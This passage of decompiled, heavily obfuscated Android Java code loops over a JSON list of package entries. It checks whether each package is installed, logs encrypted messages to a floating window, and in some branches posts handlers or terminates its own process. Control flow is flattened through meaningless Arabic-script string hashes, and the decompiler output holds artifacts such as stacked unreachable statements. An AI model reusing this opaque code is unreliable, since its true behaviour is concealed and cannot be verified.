                                                            str22 = "ۜۜۘۘۡ۟ۛ۫ۥۨۤ۠ۨ۬۬۟ۨۖۨۛۙۛۚ۫۠ۦۛ۫ۧۡۙۡۡ۬۟۬ۥ";
                                                            break;
                                                        case -1004641148:
                                                            int i = 0;
                                                            while (true) {
                                                                String str23 = "ۜۙۡۘۜۛۨ۟۟ۦ۠ۛۡۘ۫ۜۙۘ۫ۤۗۢۘۘۚۨۖۘ۬۠۬ۢۦۜۘۨۤ۠ۧۜ۬";
                                                                while (true) {
                                                                    switch (str23.hashCode() ^ (-1818792341)) {
                                                                        case -1547462065:
                                                                            String str24 = "۠ۜۘۘۛۦۧۨۘ۟ۤۥۦۘۖۗ۟ۖۗۡۘۦۤۖۙ۫ۥۤۢۤ۬ۧۨۘۤۙ۫۟ۡۛۜۛۖۜۦۖۘۚۧۛۡۗۥۘ";
                                                                            while (true) {
                                                                                switch (str24.hashCode() ^ (-1834425519)) {
                                                                                    case -834850613:
                                                                                        str23 = "ۥۖۤۨۘ۠ۗۜۖۧۤۡۡۗ۠ۨۢۧ۟ۢۡۦ۠ۤۖۖۧۙۘۘۥۦۤ۫ۢۚۖۦ۬ۡۨۗۛۤۗۢۘ۫ۙ۟ۖۘ۬ۤۗ";
                                                                                        break;
                                                                                    case 435754376:
                                                                                        str24 = i < jSONArrayOptJSONArray.length() ? "ۡۨ۟ۘۛۗۖ۬۟ۛۡۘۙۗۡۜۨۥ۟ۥۥ۫۫ۨۨۢۦۘۖۧۨۘۧ۟۠۠ۡۘۘۛۗۖۘۦ۟ۧۢۡۘۘۥۢۖ۠ۚۛ۟ۚ" : "ۘ۬ۦۘۚۧۚۡ۟ۥۘۛۙ۫ۧۤۢ۬ۗۖۘۡۖۗۚۥۗۖ۬ۤۤۡۧۘۙۖۢۗۘۢۦۘۜۜۗ";
                                                                                    case 544501483:
                                                                                        str24 = "ۦ۫ۡۦۛۨۘۘۘۖۗۙۛۥ۟ۥۡۖۙ۠ۧۤۡۜۜۘ۟ۛۦۦۗۘۘۨۖۡۘ۟ۧۙۤۖۙۚۙۘ";
                                                                                    case 1022852069:
                                                                                        str23 = "ۡۥۢۨۥۘۤۛۢۖۚۤۨۖ۬ۡۢۙۤۚۦ۠ۥۨۘۡۡۨ۬ۛۖۦۙۜۨۜ۫ۖ۫ۖۤۤۦۘۚۘ۠ۨۙ۠";
                                                                                        break;
                                                                                }
                                                                            }
                                                                            break;
                                                                        case -494656245:
                                                                            JSONObject jSONObjectOptJSONObject = jSONArrayOptJSONArray.optJSONObject(i);
                                                                            String str25 = "ۚۡ۠ۛۛۢ۬۫ۛۖۘۛ۬ۧ۬۫ۤۛۦۦۘ۫ۥ۫۠ۥۜۙۚۘۖ۫ۥۙۖۦۡۦۡۨ۫ۨۘۦۘۘۤ۫";
                                                                            while (true) {
                                                                                switch (str25.hashCode() ^ (-1533628910)) {
                                                                                    case -649900128:
                                                                                        break;
                                                                                    case 721762809:
                                                                                        String strOptString = jSONObjectOptJSONObject.optString(l2.decrypt("R1ZRX3SyGqlZVl9R\n", "NzcyNBXVf/Y=\n"));
                                                                                        int iOptInt = jSONObjectOptJSONObject.optInt(l2.decrypt("6/cY1/p9D8j24gk=\n", "j5JsspkJULw=\n"), 0);
                                                                                        int iOptInt2 = jSONObjectOptJSONObject.optInt(l2.decrypt("GJBgBOfDY7cAg3E=\n", "efMUbYitPMM=\n"), 0);
                                                                                        String strOptString2 = jSONObjectOptJSONObject.optString(l2.decrypt("mqcx2W24168=\n", "7s5Bhhndr9s=\n"), "");
                                                                                        try {
                                                                                            packageManager.getPackageInfo(strOptString, 0);
                                                                                            z3 = true;
                                                                                        } catch (PackageManager.NameNotFoundException e5) {
                                                                                            z3 = false;
                                                                                        }
                                                                                        String str26 = "۬ۚۜۘۖۧۖۜۡۦۘۖۘۙۛ۟۟ۡۛۢۥۧۧۜۚۚۜۨۘۜ۫ۢ۟ۦۘۗۜۨۘ";
                                                                                        while (true) {
                                                                                            switch (str26.hashCode() ^ (-346897683)) {
                                                                                                case 287082830:
                                                                                                    str26 = "۟ۖۜۤۡۘۤ۫ۙۙ۠ۨۖۜۛۛۧ۟ۧۛۦۖۙ۟۬۠ۡ۠ۘۘۤۥۥۤۚۜۘۘۛۧۤۖۘۘۗۗۙۜۜۛ";
                                                                                                case 394281478:
                                                                                                    break;
                                                                                                case 495755739:
                                                                                                    String str27 = "ۖ۠ۧ۬ۤۦۘ۫ۘۘۚۘ۬ۥ۫ۨۛۢۘۗۙۘۘۦۡۘۛ۫ۡۧۤۛۦۧۜۘۚۨۢۦۧۗۥۤۧ";
                                                                                                    while (true) {
                                                                                                        switch (str27.hashCode() ^ (-1146982658)) {
                                                                                                            case -2110355356:
                                                                                                                str27 = "ۘۦۛۥۙۖۛۚ۠ۘۗۥۘ۫ۤۗۨۘۧۖۜۨۙۖۘۤ۬۬ۘۛ۟ۦۗۧۗۨۡۙۨۘۘۥۧۤۘۜۘ۟ۧۦ";
                                                                                                            case -1027672444:
                                                                                                                str27 = iOptInt == 0 ? "ۜ۠ۢ۬ۤۢۜۦۤۤۘۥۘۦۛۙۖۚۢۨۡۢۘۚۤ۠۫ۤۖۧۧۗۦۤۧۦۡۘۤ۟ۨۘ۠ۙۤۖ۫ۦۘ۟۬ۘۥۨۡۘ۫ۡ" : "۟ۤۖۘۚ۫ۧۘۙۨ۫ۚۖۖۜ۬ۛۦۘۖۘۜۘۚ۬ۨۖۧۦۘۜۡۘۘۚۥۤۗ۠ۛ";
                                                                                                            case 166382213:
                                                                                                                str26 = "ۡ۠ۦۜۡۨۘ۫ۚ۠۟ۜۚ۠۬ۥ۫ۥۖۘ۫ۦۤۜۖۘۤ۬ۧ۬ۥ۟ۧ۬۬ۧۚۦۘ";
                                                                                                                break;
                                                                                                            case 1320236029:
                                                                                                                str26 = "ۖۙۤۡۧۖۘۜ۫ۦۘۦۦۨۜۥ۠ۖۧۨۘۦ۬ۖۘۢۢۨۘ۠۬ۦۘۙۘۧۘۨۥۖۤ";
                                                                                                                break;
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                                case 1677592399:
                                                                                                    String str28 = "ۨۜۡۘۙۢۜۜۦۧۘۧۨۧ۠۫ۥ۬ۗ۬ۧۡۘۖۧۗ۬ۛۥۤۜۤ۟ۜۙۗۙۨۡۜۛۚۥۖۗۥ۬ۧۙۙ";
                                                                                                    while (true) {
                                                                                                        switch (str28.hashCode() ^ 1429058469) {
                                                                                                            case -1112831449:
                                                                                                                break;
                                                                                                            case -481673820:
                                                                                                                break;
                                                                                                            case 102813659:
                                                                                                                str28 = "۟۬ۦۤۥۗۧۢۜۙۘۢۗ۠۟۟ۗۙ۟ۜۛۗۗۥۘۤۦۤۥۘۚۥۦ۬ۘۧۦۘۚ۫ۨۜ۠۬۬ۥۧۘۡۚۖ";
                                                                                                            case 835439619:
                                                                                                                String str29 = "۠ۙۢۢۖۜۘۗۘ۬ۦۚۙ۠ۧۛۤۥۗۚ۬ۦۘۛۡۧۘۡۖ۫ۦۧ۠ۛ۫ۙۚۗۗۨۘۨۘ۬ۦۤ";
                                                                                                                while (true) {
                                                                                                                    switch (str29.hashCode() ^ 1149379665) {
                                                                                                                        case -732941971:
                                                                                                                            str28 = "ۧۖ۟۠ۦ۟ۖۜۛۜۧۘۘ۟۫۬ۧۖۡۘۘۥۨۛۢۗۤۘۚۜۗ۬ۨۦۨۧۢۧۡۥۗۜ۬ۥۤۛۖۢ۠ۥۛۛۜ";
                                                                                                                            break;
                                                                                                                        case -340828527:
                                                                                                                            str29 = !z3 ? "ۜۖۚ۠۠ۡۘۖۤۥ۬ۗۡۘۚۧۨ۫ۢۙۡۚۜ۠۬ۥۘۙۡۜۜۘۡۖ۫۫ۖۦۗۤۙۦۘۨۙۧ۟ۜۛۖ۠ۨۖۨۘۘ۠ۥۥ" : "ۥ۠ۤۢ۟ۡۖۚ۬ۦ۟ۡۡ۠ۥۘۚۡۦۜۘۤۛۦۨۘۦۙۖ۟ۦۨ۫ۚ۠ۥۗ۬ۜۚۚۦ۫ۦۛ۠ۢ۠ۙۡۘۜۢ۫ۛۤۚ";
                                                                                                                        case 675885003:
                                                                                                                            str29 = "ۡۤۤۤۡ۠۟ۖۖۘۙۢ۬ۚۢۤۨۡۥۘ۟ۙۘۘۦۖۚ۫ۧۘۢۚۨۘۨ۠ۗ۠ۖۥ";
                                                                                                                        case 1561179477:
                                                                                                                            str28 = "ۖۙۢۥۤ۠ۛۦۖۘ۫ۦۥۘۖۨۧۘۚۨۜۧ۠ۦۘۘۚۦۘۧۥۡۘ۬ۘ۬";
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                break;
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                            }
                                                                                        }
                                                                                        String str30 = "ۥۧۗۘۢۥ۟ۜۧۚۛ۬ۨۥۦۘۗۚۘۜۖۖۦۨ۠۬ۚ۟ۧۢۜۖ۠ۧۢۨۘۦ۠ۜۚۙ";
                                                                                        while (true) {
                                                                                            switch (str30.hashCode() ^ 856360121) {
                                                                                                case 951302115:
                                                                                                    String str31 = "ۡۦۤۦۡۚۧۨۡۘۡۥۨۡۙۙۡۚ۫۠ۢۚ۫ۘۘۨۖۢۗ۬ۥۚۙۡۧۗ";
                                                                                                    while (true) {
                                                                                                        switch (str31.hashCode() ^ 534224627) {
                                                                                                            case -1564846540:
                                                                                                                break;
                                                                                                            case -892489035:
                                                                                                                String str32 = "ۧ۬ۖۚۖۦۘۥۧۖۤ۠ۖۘۖۜ۟ۘۦۙۛۦۨۖۗۚۦۦۤۖ۫ۖ۟۠ۜۘۦۡ۠ۚۖۧ۬ۙۗۡۥ۟ۜۢۧۛۙۧۧۜۚ";
                                                                                                                while (true) {
                                                                                                                    switch (str32.hashCode() ^ 1411776756) {
                                                                                                                        case -2038033531:
                                                                                                                            str31 = "۫۬ۥۘۥ۬ۡۘۚۨ۫ۜۜۜۘۥۖۘ۟ۚۤۚۗۖۛۜۡۧۡۘۘ۬ۨۘۘ۫ۘۜ۟۟ۜۘۦۖۨۖۙ۫";
                                                                                                                            break;
                                                                                                                        case -1801802337:
                                                                                                                            str32 = !z3 ? "۠۟ۧۘ۫ۡۨ۫ۦۤۤۖ۟ۜۜۢۛۘۚۨۥۥۙۚۢ۟۠ۚ۬ۗ" : "ۢۖۧۡۦۗۦۢ۫ۘۗ۠۫۫ۤۧۚۦۚۘ۬ۜ۫۠۫۟ۙۚۗۚۜۜۡۢۙۙۗۗۤۥۙۡ۫۟ۗۜۘۗۡۙۗۙۨ";
                                                                                                                        case -1434039131:
                                                                                                                            str31 = "۟۬ۧۥۤۥۘۙۥۦۢۦۛۛۖۘۜۜۗ۫۫ۨۡۖۥ۟۫ۡۘۗۘ۫۠ۨۧۘۢ۠ۛۡۡۧۖۛۘۧۦۜ۫ۘۧۘ";
                                                                                                                            break;
                                                                                                                        case 198783998:
                                                                                                                            str32 = "ۛۧۨۘۤۜۦۘۘۚۘۘۦ۫ۨۧۛۡۘۨۦۡ۬۠۬ۚۜۨۘۖۢ۟ۧۧۜۛۚۢۜ۫ۘۢۛۖۘۖۤۡۘۘۡۛ۠ۥ۬";
                                                                                                                    }
                                                                                                                }
                                                                                                                break;
                                                                                                            case 105427013:
                                                                                                                break;
                                                                                                            case 490670150:
                                                                                                                str31 = "ۦۦۨۦ۬ۙۙۗۙۙ۫ۖ۠ۗۥۘ۫ۗۛ۠ۡۧۘ۫ۛۥ۫ۦ۠۠ۜۦۘۡۢۧۘۤ۟ۥۢۡۘۡ۫۬ۢ۟ۘۘۤۜ۫";
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                                case 1434741332:
                                                                                                    break;
                                                                                                case 1650026218:
                                                                                                    str30 = "ۥۢۛ۫ۥۖۨۜۖۘۨ۟ۘۘ۬۫ۜۘۤۜۖۘۡۙۖۘۘۘۥۦۘۢۗۦۜۤ۠ۨۘ۟ۘۧ";
                                                                                                case 1961371266:
                                                                                                    String str33 = "ۚۜۚ۟ۧۢ۫ۤۜ۫ۡۘ۬ۢۜۘۧۥۨۘۗۡۜۘۧۜۨۘۦۥ۟۟۫ۨ۫ۖۡ۠۠ۤۘۙ۫ۦۤۨۘۗ۫ۢۧ۫۫";
                                                                                                    while (true) {
                                                                                                        switch (str33.hashCode() ^ 1804084651) {
                                                                                                            case -2135908389:
                                                                                                                str30 = "ۥۙۧۛ۫ۜۘۙۙۧۙۘۗ۫ۨۜۘ۟۟ۥۘۗۗۜۘۤۙۨۤ۬ۖ۫ۛۤۖۜۤۢۤۛ۟۠ۛ۫ۘۖۘ";
                                                                                                                break;
                                                                                                            case -1590691238:
                                                                                                                str33 = "ۗۨۥۘۜۘۤ۠ۧ۬۠ۜۙۥۘۦۘۦۥۦۘ۟ۘۖۘ۬ۧۦۤۡۘۘۘ۫ۘۘۢۡ۟ۥۜۦۡ۬ۡۛۙۢۦۤۢۦۤۦۘ۟ۚۜۜ۫";
                                                                                                            case -1569561748:
                                                                                                                str30 = "ۦۧۜۚۢۦۥۤ۫ۥۘۤۥ۫ۘۘۦۢۜۘۙۡۨۘۡۦۚ۟۫ۨۘۥۥۘۘ";
                                                                                                                break;
                                                                                                            case 1233489328:
                                                                                                                str33 = iOptInt == 1 ? "۫ۙۤۘۛۘۦ۬۬ۦۥۙ۫ۡۘ۫ۜۦۚ۫ۚۙۢۛ۬ۘۜۨۡۥۘ۟ۗۤۡۙۛۚۤۤ۟۟ۛۨۘۘۦۧ۟ۜۘۘۡۧۘ" : "ۘۨۧۘۨۖ۬ۦۦۡۘۤ۫۠ۥۛۗۡۦ۫۫ۙۡۤۦۘۘۛ۬ۡ۟ۦۜ";
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                            }
                                                                                        }
                                                                                        String str34 = "ۧۦ۠۫ۥۚۙۜۘۜۗۘۘ۫ۡۨۘۜۧۗۤۗۖۘۡ۫ۘ۫ۖۤۢ۠ۙۜۖۘ۬۟ۧ۫۫ۦۗۜ";
                                                                                        while (true) {
                                                                                            switch (str34.hashCode() ^ 1526806947) {
                                                                                                case -1137765524:
                                                                                                    String str35 = "ۘۤ۟ۘۧۧۚۚۜ۟ۖۡۢۗۜۦۥۜۗۚۨۘ۠ۚۦۘ۬ۤۥ۬ۥۧۘۚۘۦۘۢ۫ۙۚۜۧۥۡۦۘۧۖۜۘۖۢۢ";
                                                                                                    while (true) {
                                                                                                        switch (str35.hashCode() ^ 829207867) {
                                                                                                            case -1337220812:
                                                                                                                str34 = "۠ۧۡۘۤۡۘۗۥۙۦۖۖۘۙۚۘۘۤۧۜۤۙۡۘۘۨ۬ۥۗۜۘۜۙۙ۟ۨۚۤۗۧۨۢۢۢ۫۫۬ۘۧۘۖۥۧۘ۠۫ۖۘۢۥ۟";
                                                                                                                break;
                                                                                                            case -559134221:
                                                                                                                str35 = "۬ۙۛۧ۠ۖۘۙ۫ۘۘ۬ۘۡۘۛۦۜۘ۟ۚۦۘ۫ۢ۫ۨۦ۬ۢ۟ۖۙۧۜۦۙۖۚۙۘۘۗۚ۠۫ۜۦۘۗۜ۠۬ۧۦ";
                                                                                                            case -160942318:
                                                                                                                str35 = iOptInt2 != 0 ? "ۧۜۥۧۘۗ۫ۢۙۡۚۥۘ۟ۘۧۥۗۦ۠ۢۖ۠ۙۢۛۦۦ۠۠" : "ۡ۫ۧۦۘۦ۬۬ۡۡۨۨۡۡۥۡ۠ۜۧۖۚۗۜۘۚۡۗۚۢۜۘۤۛۜۘۡۧ۠ۘۧۘۤۤۥۘۧ۠۬ۥۙۨۘۡۘۨۘ۠ۤۢ";
                                                                                                            case 528878537:
                                                                                                                str34 = "ۦ۠ۗ۫ۨۘۧ۬ۤۡۨۚۛۛ۫۬ۘۗۚ۫ۦۘۜ۫ۥۘۡ۟ۜۦ۫ۡۘۜۜۜۘۜۥۘۘ";
                                                                                                                break;
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                                case -702282892:
                                                                                                    String str36 = "ۥۜۡ۬۬ۨۘۚۧۧۗۙۤ۠ۡۡۡۥۖۘۦۡۥۧۛ۠۠۠ۤ۟ۗۧ";
                                                                                                    while (true) {
                                                                                                        switch (str36.hashCode() ^ (-972993712)) {
                                                                                                            case 174625932:
                                                                                                                String str37 = "۟ۥ۬ۤۜۥۘۖۢ۠ۗۛۨۘۨۡۥۡۗۢۤۥۛۙۡۥۘۚۙۢ۟ۚۘۤۛۦۘۗۧۗ";
                                                                                                                while (true) {
                                                                                                                    switch (str37.hashCode() ^ (-1197893275)) {
                                                                                                                        case -1623508445:
                                                                                                                            String str38 = "ۙۗۦۘ۟۠ۜۘۦ۫ۗۘۢۥۚ۫ۘۙۦۛۗ۫ۨۥۜ۫ۚۛۜۡ۠ۚۛ۟ۨۡۘ۟";
                                                                                                                            while (true) {
                                                                                                                                switch (str38.hashCode() ^ (-92287859)) {
                                                                                                                                    case 572874179:
                                                                                                                                        str37 = "ۗۙۦۘۖۖۧ۠۬ۧۧۗۥۛۢۖۘ۫ۗۖۘ۬۠ۛۙ۟ۘۖۨۢۗۦۙ";
                                                                                                                                        break;
                                                                                                                                    case 1233652255:
                                                                                                                                        str37 = "ۙۜ۠۫ۧۡ۟۠ۘ۠ۚۢۖۨۨۖ۫ۛ۫ۥۨۘ۠ۜۢۙۢۢۢۦۡۜ۠۠۬ۨ۟";
                                                                                                                                        break;
                                                                                                                                    case 1695820108:
                                                                                                                                        str38 = iOptInt2 != 2 ? "ۜۤۜۘۤ۟ۖۘۤ۠ۧۚ۫ۜۘۡۥ۟ۥۙۚ۟۟ۜۤۜۧۘۡۥۜۘۢۘۨۘ۫ۜۛۘۦۧۙۤۖۘ۟۟ۜۘۘۘۦۘۙۜۤۡۥۘۨۧۢ" : "۟۬ۦۢ۫۫ۦۘ۟ۥۨۘۤ۟ۜۘۙۤۨۘۦ۠ۥۧۘۨ۫ۨۗۧۧۤۡۙۗ۠ۡ۠ۢۗۜۘ۠۠ۘۘۤ۟ۖۙۤۦۜۛۥ۟ۨۗ";
                                                                                                                                    case 1730164368:
                                                                                                                                        str38 = "ۥۘۜ۠ۥۨۙۚۨۘۢۙۖۧۥۖۧ۫۠ۗ۠ۙۜۤۢۜ۬ۡۘۜۛۖ";
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                        case -1368518661:
                                                                                                                            k2.logToFloatingWindow(l2.decrypt("CpJh464vPMdkjSScm0WNnwywbOOqOg==\n", "6AjBDBagHCI=\n") + strOptString + l2.decrypt("QSiKGvGTP7cUcolvqo5g\n", "rpQG/00q2jA=\n"), l2.decrypt("M/FtjLw=\n", "VoMf485SyzI=\n"));
                                                                                                                            new Handler(Looper.getMainLooper()).post(new q0(4, context, strOptString2));
                                                                                                                            continue;
                                                                                                                        case -1210193940:
                                                                                                                            str37 = "ۙۛ۬ۤۥۛۖۜۥۘۜۥ۫۠ۢۦۘۘ۠۠ۦۙۡۘۨۡۧۨۜۜۢ۠ۖۘۙ۬ۨۗۗۢ۠ۛۨۦۖۧۘۚۗۥۥۙۛۚۡ۬ۙۙۙ";
                                                                                                                            break;
                                                                                                                        case -490901408:
                                                                                                                            String str39 = "ۦۗۗۚۙۖۧۘۢ۠۟ۨۘۦۛۧۡۨۨۘ۬ۥۘۦ۠ۙۚۢۤۤۖ۫ۖۢ۠ۜ۫۠";
                                                                                                                            while (true) {
                                                                                                                                switch (str39.hashCode() ^ (-1780968317)) {
                                                                                                                                    case -1424408660:
                                                                                                                                        k2.logToFloatingWindow(l2.decrypt("ADuiRZPnVpNuJOc6po3nywYZr0WX8g==\n", "4qECqitodnY=\n") + strOptString + l2.decrypt("eiMox9XtrDEveSuyjvDzUywpQ5n6stQpfSA0ysjY\n", "lZ+kImlUSbY=\n"), l2.decrypt("VOqZZvI=\n", "MZjrCYCWg8U=\n"));
                                                                                                                                        new Handler(Looper.getMainLooper()).post(new q0(5, context, strOptString2));
                                                                                                                                        new Handler(Looper.getMainLooper()).postDelayed(new a(5), 1500L);
                                                                                                                                        continue;
                                                                                                                                        continue;
                                                                                                                                        continue;
                                                                                                                                        continue;
                                                                                                                                        continue;
                                                                                                                                    case -454196599:
                                                                                                                                        str39 = "ۧۘۧۘ۫ۧۢۥ۬ۢۦۥۡۘۢۗۢۡۥ۟ۤۖۧۘۜۛ۠ۡ۬ۜۜۘۙۜ۠ۖۘۖۗۚۧۘۧۘۙۦۦ۠ۘۦۘ۟ۦۦۘۗۖ۟ۙ۫ۡۘ";
                                                                                                                                        break;
                                                                                                                                    case 882881399:
                                                                                                                                        String str40 = "ۥ۫ۚۙۥۗۤۚۢ۟ۜ۠ۦ۟ۛۡۜ۬۠ۚۦۚۛۨۥۖۘۖۘۧۘ";
                                                                                                                                        while (true) {
                                                                                                                                            switch (str40.hashCode() ^ 1766273405) {
                                                                                                                                                case -1726341505:
                                                                                                                                                    str40 = iOptInt2 != 3 ? "۠ۨۧۘۜ۠ۧۧۢۥۘۨۦۡۘۙۚ۬ۤۦۨۘۡ۠۫ۛۧۘۢۦۘۦۢۡۦۙۖۖۜۨۙۖۖۚ۠۫" : "ۥۡۖۘۖۜۚۢۧۥۘ۠ۧۦۡۜۜۛ۟۟۬ۗ۠۠ۘ۟۫ۖ۠ۡ۠۠";
                                                                                                                                                case -1347507397:
                                                                                                                                                    str39 = "۠۫ۤ۬۠ۥۜۨۜۖ۬ۘۘۨۡۖۘۥۥۨۘۗۦۘۘۚ۟ۦۨۘۤ۠ۨۚ۠۫ۙۥۘ";
                                                                                                                                                    break;
                                                                                                                                                case 255901652:
                                                                                                                                                    str39 = "ۡۙۜۘۤۗۥۘ۫ۢۥۚۡ۬۬ۤۢۖ۠ۗۤ۠۟ۨۨۨۛۘۧۘۚۛۡۘ۟ۡۜ۫۠۟";
                                                                                                                                                    break;
                                                                                                                                                case 353111153:
                                                                                                                                                    str40 = "ۜ۫۠ۛۡۡۗ۬ۚۜۧۡۘۨۦ۫ۗۖۜۘ۬ۥۦ۟ۤۖۘۥ۠ۙۧۘۡ۟ۥۘ۟ۧۘۖۡۜۤۖۜۘ";
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                        break;
                                                                                                                                    case 1887716272:
                                                                                                                                        break;
                                                                                                                                }
                                                                                                                            }
                                                                                                                            break;
                                                                                                                    }
                                                                                                                }
                                                                                                                break;
                                                                                                            case 811315028:
                                                                                                                k2.logToFloatingWindow(l2.decrypt("N5REiQQ/w/ZZiwH2MVVyrjG2SYkAKg==\n", "1Q7kZryw4xM=\n") + strOptString + l2.decrypt("JdxpstUICEpViFrFhjpi\n", "ymDlVW6b7tc=\n"), l2.decrypt("Cl8uNXs=\n", "by1cWgnfNwM=\n"));
                                                                                                                Process.killProcess(Process.myPid());
                                                                                                                countDownLatch.countDown();
                                                                                                                return Boolean.TRUE;
                                                                                                            case 1178695137:
                                                                                                                String str41 = "ۛۖۙۘۖۥۘۙۥۥۢۗۜۘۜۙۥۜۗۨ۟ۡۜۦۨۖۘۢۤۙۜۘۚۙۡۡۢۖۧۦۖۨۢ";
                                                                                                                while (true) {
                                                                                                                    switch (str41.hashCode() ^ (-1252849481)) {
                                                                                                                        case -1534447939:
                                                                                                                            str36 = "۫ۡۡۘۧۗ۬ۘۦۘۘۛۥۚۧ۠ۜۡۛۤۙۛۡۚۗۙ۫ۖۜۘ۫ۙ۠ۘۙۗۜۖ۠ۗ۫ۖۧۛۦۘ";
                                                                                                                            break;
                                                                                                                        case -232134530:
                                                                                                                            str41 = iOptInt2 != 1 ? "۬ۚۤۚۨۚۙ۫ۡۘ۠ۡۘۘۤۜۘۘۛ۠۟ۗۡۘۡۚۤۦۧۙۖۥ۫" : "ۦۦ۬ۨۖ۠ۨۡۘۙ۟ۙۗ۫ۦۘۛۤۛۘۦۘ۫۟ۘۚۨۙۤۚ۟";
                                                                                                                        case -189263519:
                                                                                                                            str36 = "۟۠ۘۤ۫ۤ۟۟ۗۨۡۖۘ۠ۢۜۚۛۘۘۧۢۧۢۜۛۥۖۡۘۖۖۗۙۨۨۢۡۥۘۛۨۧۜ۫ۥۘۥۗۨۢ۬ۖۢۨ۬ۦۦۖ";
                                                                                                                            break;
                                                                                                                        case -33159948:
                                                                                                                            str41 = "ۜۦ۠ۡۥۘۘ۫ۜۜۚۜۢۖ۫ۤ۬ۘۘۖۗۦۘۚ۬۟ۖ۬ۜۦۨ۠ۖ۫۠ۜۥۤ";
                                                                                                                    }
                                                                                                                }
                                                                                                                break;
                                                                                                            case 1837953714:
                                                                                                                str36 = "۠ۙۨۘۨۗۤۙۗۜۘۢۨۗۨ۠ۡۘۚۦ۟ۛۦۢۙۙۘۛۛۢۦۧ۬ۧ۟ۜۘۖۢۥۘ۠ۨۜۘۙ۟ۜ";
                                                                                                                break;
                                                                                                        }
                                                                                                    }
                                                                                                    break;
                                                                                                case -102238325:
                                                                                                    k2.logToFloatingWindow(l2.decrypt("Q/55aAyUgnwt4TwXOf4zJEXcdGgIgQ==\n", "oWTZh7Qbopk=\n") + strOptString + l2.decrypt("t4P4ETGL4In62v5WYr67wfuM\n", "WD909ooDBiQ=\n"), l2.decrypt("QUMZo6A=\n", "JDFrzNL/UsI=\n"));
                                                                                                    a = false;
                                                                                                    countDownLatch.countDown();
                                                                                                    return Boolean.TRUE;
                                                                                                case 35988572:
                                                                                                    str34 = "ۤۤۦۘۤۚۡۘ۠ۚۦۘ۫ۖۙۧۡۦۧ۫ۨۘۜۥۗۤۛۨۗۢ۬ۧۢۦۘ۟ۤۥۘۡ۠ۡۘۜۤۥۨۛۦۥ۟ۜۗۖۦ";
                                                                                                    break;
                                                                                            }
                                                                                        }
                                                                                        break;
                                                                                    case 1229389091:
                                                                                        str25 = "ۤۢۦۡۨۨۧۙۧ۬ۥۧۛۥ۬ۙۙۚۨ۠ۡۘۘۤۨۘۤۦۨۤۨۡۨۛۗۗۥۧ۬۟ۜۗ۫ۖۜۚۢۤۤۜ";
                                                                                        break;
                                                                                    case 1681823221:
                                                                                        String str42 = "ۜۜۥۜۖۖۥۥۨۘۖۜۨۘۦۚ۫ۗۦۜۛ۟ۨۘۧۥۖۗۙۦۘۨۗۨ۬ۡۗۡۖ۟";
                                                                                        while (true) {
                                                                                            switch (str42.hashCode() ^ 549874390) {
                                                                                                case -967100598:
                                                                                                    str42 = jSONObjectOptJSONObject == null ? "ۘۗۘ۬ۜۦۚ۬ۙ۟ۥۢۨۜۖۢۨۜ۠ۢ۠ۥۜۘۤۖۛۙۖۘۚ۠ۖۥۢۗۛۛۚ۠ۥۜۘۜۙ۟ۚ۠ۚ۫ۥۥۘۗۦۡ" : "۫ۛۙۦۗۜۘ۬ۡۨ۫ۢۙۚۡۢ۫ۡۜۘۘ۟۟ۤۗ۬ۥۘۤۛۤۨۜۦۛۘ۬ۖۙۧۨۡۛۗۤ۟ۧ۬";
                                                                                                case -76442243:
                                                                                                    str25 = "ۥۖۖۚۘۥۨۚ۟ۜۢۖۘۙۢ۟ۢۢۢۨۤۢ۠ۡۧۙۨۘۘۘ۠ۛۤۛۡۢۦ۟ۧۙ۟ۧ۫ۘۘۗۛۛۘۧ";
                                                                                                    break;
                                                                                                case 1404697604:
                                                                                                    str25 = "ۤ۠ۖۘۡۜۛۤۜ۠۫۠ۨۥۥۜۤۛ۫ۧۗ۫ۖۨۥۘۙۢ۬ۛ۫ۤۦۤۗۧۚۥۘ۫ۙۧۨ۠ۖۖ۟ۙۦ۟ۢ";
                                                                                                    break;
                                                                                                case 1835990987:
                                                                                                    str42 = "ۥۢۘۘۨۜۦۨۤ۟۫۟ۧۚۤۘ۬ۗۨۗۗۖۘۥۨۗۡۥۜۘۚ۬ۖۘ";
                                                                                            }
                                                                                        }
                                                                                        break;
                                                                                }
                                                                            }
                                                                            i++;
                                                                            break;
                                                                        case 132995249:
                                                                            break;
                                                                        case 1768521088:
                                                                            str23 = "ۡۛۤۤ۟ۡۤ۟ۘۢ۟ۗ۫ۙۜۧۜۤۘۡۧۘۢۦۦۚۗۜۘۦۡۢ";
                                                                            break;
                                                                    }
                                                                }
                                                            }
                                                            break;
                                                        case -502065575:
                                                            break;
                                                        case 774950722:
                                                            String str43 = "۠۫۠۠ۥۚۗۖۥۗۥۗۤۧۨۨۥۜ۬ۖۥۘۦۜۙۖۜ۫ۡۤ۠ۜۢۘۢ۟ۥ۟ۚۚۘۚۦۘ۠۫ۘۚ۫ۘۘ";
                                                            while (true) {
                                                                switch (str43.hashCode() ^ 1684606902) {
                                                                    case -1492336524:
                                                                        if (jSONArrayOptJSONArray.length() <= 0) {
                                                                            str43 = "ۛۜۨۘۜۡۦۘۖۖۦۘۛۥۢۘۚۜۙۨۜۖۤۚۡۗ۟ۥۦۨۜۥۦۘ۫ۖۡۘۛۙۨۘۤۥۦۘۡۨۛۛۛۜۚۚۗ";
                                                                            break;
                                                                        } else {
                                                                            str43 = "ۨۛۡۖۤ۫ۙۖۥۗ۫ۢۤۡۘۧۧۦ۫ۚۦۘۢۡۨۨۛۜۘ۠۫ۗ";
                                                                            break;
                                                                        }
                                                                    case 472472168:
                                                                        str22 = "ۧۚۛۤۡۖ۫۠ۗۨۥۖۘۘۜۦۘۚۧۖۘۦ۟۟ۛۙۘۘۡۜۥۜۥۘ۬ۙ۟۟ۘ۬ۤ۟ۛۛۦۖۘۤۖۢ۠ۗۖۘ";
                                                                        continue;
                                                                    case 1368266894:
                                                                        str22 = "ۜۖۜۘۥ۫ۘۘۤۗۨۘۤۡۙۡۢۙۨۡۦۘۤۗۨ۫ۘۡۘۤۙۧۥۨۦۚ۟۠۬ۙۤ";
                                                                        continue;
                                                                    case 1825171395:
